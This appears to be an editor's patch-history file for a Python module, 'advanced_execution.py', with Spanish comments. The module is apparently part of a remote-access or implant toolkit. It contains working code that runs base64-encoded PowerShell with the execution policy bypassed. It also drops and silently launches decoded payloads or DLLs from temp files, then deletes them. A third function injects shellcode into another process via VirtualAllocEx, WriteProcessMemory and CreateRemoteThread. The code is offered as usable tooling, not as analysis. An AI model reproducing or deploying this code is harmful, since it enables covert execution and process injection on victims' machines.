{
    "sourceFile": "src/modules/advanced_execution.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 1,
            "patches": [
                {
                    "date": 1740260810285,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740261419632,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -1,13 +1,33 @@\n+\"\"\"\r\n+Módulo de ejecución avanzada.\r\n+Proporciona funcionalidades avanzadas para la ejecución de código y scripts,\r\n+incluyendo ejecución en memoria, inyección de código y manejo de DLLs.\r\n+\"\"\"\r\n+\r\n import subprocess\r\n import ctypes\r\n import sys\r\n import base64\r\n import tempfile\r\n import os\r\n \r\n def execute_powershell(script):\r\n-    \"\"\"Ejecuta un script de PowerShell en memoria.\"\"\"\r\n+    \"\"\"\r\n+    Ejecuta un script de PowerShell directamente en memoria.\r\n+    \r\n+    El script se codifica en base64 para evitar problemas con caracteres especiales\r\n+    y se ejecuta usando powershell.exe con bypass de políticas de ejecución.\r\n+    \r\n+    Args:\r\n+        script (str): Contenido del script PowerShell a ejecutar\r\n+    \r\n+    Returns:\r\n+        dict: Resultado de la ejecución\r\n+            - success (bool): Si el script se ejecutó correctamente\r\n+            - output (str): Salida del script\r\n+            - error (str): Errores durante la ejecución\r\n+    \"\"\"\r\n     try:\r\n         encoded_script = base64.b64encode(script.encode('utf16le')).decode()\r\n         cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_script}'\r\n         result = subprocess.run(cmd, capture_output=True, text=True)\r\n"
                }
            ],
            "date": 1740260810285,
            "name": "Commit-0",
            "content": "import subprocess\r\nimport ctypes\r\nimport sys\r\nimport base64\r\nimport tempfile\r\nimport os\r\n\r\ndef execute_powershell(script):\r\n    \"\"\"Ejecuta un script de PowerShell en memoria.\"\"\"\r\n    try:\r\n        encoded_script = base64.b64encode(script.encode('utf16le')).decode()\r\n        cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_script}'\r\n        result = subprocess.run(cmd, capture_output=True, text=True)\r\n        return {\r\n            'success': result.returncode == 0,\r\n            'output': result.stdout,\r\n            'error': result.stderr\r\n        }\r\n    except Exception as e:\r\n        return {'success': False, 'error': str(e)}\r\n\r\ndef execute_background_payload(payload_data, is_dll=False):\r\n    \"\"\"Ejecuta un payload en segundo plano.\"\"\"\r\n    try:\r\n        temp = tempfile.NamedTemporaryFile(delete=False)\r\n        temp.write(base64.b64decode(payload_data))\r\n        temp.close()\r\n        \r\n        if is_dll:\r\n            ctypes.CDLL(temp.name)\r\n        else:\r\n            startupinfo = subprocess.STARTUPINFO()\r\n            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW\r\n            subprocess.Popen(temp.name, startupinfo=startupinfo)\r\n            \r\n        os.unlink(temp.name)\r\n        return {'success': True}\r\n    except Exception as e:\r\n        return {'success': False, 'error': str(e)}\r\n\r\ndef inject_shellcode(pid, shellcode):\r\n    \"\"\"Inyecta shellcode en un proceso.\"\"\"\r\n    try:\r\n        shellcode_bytes = base64.b64decode(shellcode)\r\n        \r\n        # Obtener handle del proceso\r\n        h_process = ctypes.windll.kernel32.OpenProcess(\r\n            0x1F0FFF, # PROCESS_ALL_ACCESS\r\n            False,\r\n            pid\r\n        )\r\n        \r\n        if not h_process:\r\n            return {'success': False, 'error': 'No se pudo abrir el proceso'}\r\n\r\n        # Asignar memoria\r\n        mem_addr = ctypes.windll.kernel32.VirtualAllocEx(\r\n            h_process,\r\n            None,\r\n            len(shellcode_bytes),\r\n            0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE\r\n            0x40  # PAGE_EXECUTE_READWRITE\r\n        )\r\n\r\n        if not mem_addr:\r\n            return {'success': False, 'error': 'No se pudo asignar memoria'}\r\n\r\n        # Escribir shellcode\r\n        written = ctypes.c_size_t(0)\r\n        ctypes.windll.kernel32.WriteProcessMemory(\r\n            h_process,\r\n            mem_addr,\r\n            shellcode_bytes,\r\n            len(shellcode_bytes),\r\n            ctypes.byref(written)\r\n        )\r\n\r\n        # Crear thread remoto\r\n        h_thread = ctypes.windll.kernel32.CreateRemoteThread(\r\n            h_process,\r\n            None,\r\n            0,\r\n            mem_addr,\r\n            None,\r\n            0,\r\n            None\r\n        )\r\n\r\n        if not h_thread:\r\n            return {'success': False, 'error': 'No se pudo crear el thread'}\r\n\r\n        return {'success': True}\r\n    except Exception as e:\r\n        return {'success': False, 'error': str(e)}\r\n"
        }
    ]
}